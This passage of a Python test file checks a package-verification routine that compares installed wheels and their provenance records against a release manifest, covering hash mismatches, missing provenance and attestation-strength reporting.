        "dossier": _provenance(None, mode=InstallMode.ABSENT),
        "agent-suite": _provenance(dist_info, component="agent-suite"),
    }
    result = verify_installed_artifacts(
        manifest, provenance, wheels_dir=wheel.parent, require_binding=True
    )
    assert result.ok, result.note
    umbrella = next(c for c in result.components if c.component == "agent-suite")
    assert umbrella.strength is AttestationStrength.WHEEL_HASH_CHAIN
    assert umbrella.binds_release_identity


def test_umbrella_without_provenance_is_a_gap_under_require_binding() -> None:
    """MAJOR-2 regression: absent umbrella provenance must not report ok:true."""
    manifest = _manifest(umbrella_version=_VERSION, umbrella=(_WHEEL_NAME, "e" * 64))
    provenance = {
        "regista": _provenance(None, mode=InstallMode.ABSENT),
        "dossier": _provenance(None, mode=InstallMode.ABSENT),
    }
    result = verify_installed_artifacts(manifest, provenance, require_binding=True)
    umbrella = next(c for c in result.components if c.component == "agent-suite")
    assert umbrella.strength is AttestationStrength.NO_PROVENANCE
    assert "agent-suite" in result.unbound
    assert not result.ok


def test_wheel_files_are_verified_for_non_installed_constituents(tmp_path: Path) -> None:
    """``--installed --wheels-dir`` is a superset of the wheels-only check."""
    wheel = _build_wheel(tmp_path / "wheels")
    other = tmp_path / "wheels" / "dossier_hraedon-0.1.0-py3-none-any.whl"
    other.write_bytes(b"dossier wheel bytes")
    manifest = _manifest(
        wheel_hashes={
            "regista": (_WHEEL_NAME, _sha256_file(wheel)),
            "dossier": (other.name, "0" * 64),  # deliberately wrong
        }
    )
    provenance = {
        "regista": _provenance(None, mode=InstallMode.ABSENT),
        "dossier": _provenance(None, mode=InstallMode.ABSENT),
    }
    result = verify_installed_artifacts(manifest, provenance, wheels_dir=wheel.parent)
    assert not result.ok
    assert any("wheel_sha256 mismatch" in m for m in result.wheel_file_mismatches)
    # Both constituents are absent locally, so both wheel FILES are hashed.
    assert result.wheel_files_checked == 2


def test_format_text_labels_the_weakest_rung_and_names_gaps(
    pip_install: tuple[Path, Path],
) -> None:
    wheel, dist_info = pip_install
    manifest = _manifest(wheel_hashes={"regista": (_WHEEL_NAME, _sha256_file(wheel))})
    provenance = {
        "regista": _provenance(dist_info, archive_url=wheel.as_uri()),
        "dossier": _provenance(None, mode=InstallMode.ABSENT),
    }
    result = verify_installed_artifacts(manifest, provenance, wheels_dir=wheel.parent)
    text = format_text(result)
    assert "weakest rung across attested components" in text
    assert "strongest common rung" not in text
    assert "unattested:" in text
    assert "bytecode_cache" in text
    assert isinstance(result, ArtifactAttestation)
    assert result.unattested_total > 0
